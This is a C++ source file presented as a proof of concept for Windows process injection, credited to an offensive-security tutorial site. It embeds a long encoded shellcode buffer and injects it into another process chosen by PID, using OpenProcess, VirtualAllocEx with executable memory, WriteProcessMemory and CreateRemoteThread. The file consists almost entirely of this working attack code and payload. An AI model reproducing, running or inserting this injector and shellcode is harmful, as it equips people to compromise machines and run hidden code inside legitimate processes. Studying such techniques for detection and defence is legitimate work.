#include "Windows.h"
#include <iostream>
using namespace std;

/*
    Process Injection using CreateRemoteThread PoC - C++ 

    Code from https://www.ired.team/offensive-security/code-injection-process-injection/process-injection 
    All credit goes to spotheplanet
*/
int main(int argc, char* argv[])
{
    unsigned char buf[] =
        "\x48\x31\xc9\x48\x81\xe9\xc0\xff\xff\xff\x48\x8d\x05\xef\xff"
        "\xff\xff\x48\xbb\x67\x94\xe3\xca\x54\x5c\x59\x92\x48\x31\x58"
        "\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x9b\xdc\x60\x2e\xa4\xb4"
        "\x95\x92\x67\x94\xa2\x9b\x15\x0c\x0b\xc3\x31\xdc\xd2\x18\x31"
        "\x14\xd2\xc0\x07\xdc\x68\x98\x4c\x14\xd2\xc0\x47\xd9\xd2\x03"
        "\x1c\x53\xee\xd8\x2d\xdc\x68\xb8\x04\x14\x68\x52\xcb\xa8\x82"
        "\xb6\x56\x70\x79\xd3\xa6\x5d\xee\x8b\x55\x9d\xbb\x7f\x35\xd5"
        "\xb2\x82\xdf\x0e\x79\x19\x25\xa8\xab\xcb\x84\x3a\xd8\xea\x7f"
        "\x9f\xe1\xc5\xd1\x2e\x59\x92\x67\x1f\x63\x42\x54\x5c\x59\xda"
        "\xe2\x54\x97\xad\x1c\x5d\x89\x19\x2f\x8c\xa7\x41\x14\x7c\x09"
        "\xdb\x66\x44\x00\x9c\x1c\xa3\x90\xdf\x56\x5d\xa2\x41\x60\xd4"
        "\x11\x93\xb1\xdc\xd2\x0a\xf8\x1d\x98\x5b\x6a\xd5\xe2\x0b\x6c"
        "\xbc\x2c\x63\x2b\x97\xaf\xee\x5c\x19\x60\x43\x12\x4c\xbb\x8e"
        "\xdf\x1c\x7d\xdb\x66\x44\x85\x8b\xdf\x50\x11\xd6\xec\xd4\xff"
        "\x83\x55\x8c\x18\x19\x63\x1c\xa2\x92\x15\x04\x07\xda\x66\x44"
        "\xba\x90\x15\x04\x18\xcb\x26\xce\xab\x49\xb8\x7c\x18\xc0\x98"
        "\x74\xbb\x8b\x0d\x06\x11\x19\x75\x7d\xa8\x35\xab\xa3\x04\xdb"
        "\xd9\xe3\x90\xf8\x0b\x6f\x6b\x92\x67\xd5\xb5\x83\xdd\xba\x11"
        "\x13\x8b\x34\xe2\xca\x54\x15\xd0\x77\x2e\x28\xe1\xca\x55\xe7"
        "\x99\x3a\x57\xfb\xa2\x9e\x1d\xd5\xbd\xde\xee\x65\xa2\x70\x18"
        "\x2b\x7f\x95\x98\x41\xaf\x43\xbe\x34\x58\x93\x67\x94\xba\x8b"
        "\xee\x75\xd9\xf9\x67\x6b\x36\xa0\x5e\x1d\x07\xc2\x37\xd9\xd2"
        "\x03\x19\x6d\x99\xda\x98\x54\xab\x43\x96\x14\xa6\x52\x2f\x1d"
        "\x22\x8b\xee\xb6\x56\x4d\x87\x6b\x36\x82\xdd\x9b\x33\x82\x26"
        "\xcc\xaf\x43\xb6\x14\xd0\x6b\x26\x2e\x7a\x6f\x20\x3d\xa6\x47"
        "\xe2\x54\x97\xc0\x1d\xa3\x97\xe7\x82\x7c\x70\xca\x54\x5c\x11"
        "\x11\x8b\x84\xab\x43\xb6\x11\x68\x5b\x0d\x90\xa2\x92\x1c\xd5"
        "\xa0\xd3\xdd\x96\x3a\x02\x0b\xa3\x8c\x11\x9f\x94\x9d\x9f\x1c"
        "\xdf\x9d\xb2\x39\x1d\x15\xa0\x14\x1d\x00\xfa\x67\x84\xe3\xca"
        "\x15\x04\x11\x1b\x95\xdc\xd2\x03\x15\xe6\x01\x36\x34\x71\x1c"
        "\x1f\x1c\xd5\x9a\xdb\xee\x53\xae\xfb\x9d\x15\xd0\x62\x2f\x1d"
        "\x39\x82\xdd\xa5\x18\x28\x65\x4d\x2b\x95\xab\x89\xda\x6a\x67"
        "\xe9\xcb\x92\x15\x0b\x00\xfa\x67\xd4\xe3\xca\x15\x04\x33\x92"
        "\x3d\xd5\x59\xc1\x7b\x53\x69\x6d\xb2\xc3\xba\x8b\xee\x29\x37"
        "\xdf\x06\x6b\x36\x83\xab\x92\xb0\xae\x98\x6b\x1c\x82\x55\x9f"
        "\x11\xbb\xa1\xdc\x66\x3c\x21\xe8\x18\x6d\x80\xcc\x89\xca\x0d"
        "\x15\x9e\x50\x97\x21\x41\x9c\xab\x89\x59\x92";



    HANDLE processHandle;
    HANDLE remoteThread;
    PVOID remoteBuffer;

    printf("Injecting to PID: %i", atoi(argv[1]));
    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
    remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof buf, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(processHandle, remoteBuffer, buf, sizeof buf, NULL);
    remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
    CloseHandle(processHandle);


    return 0;

}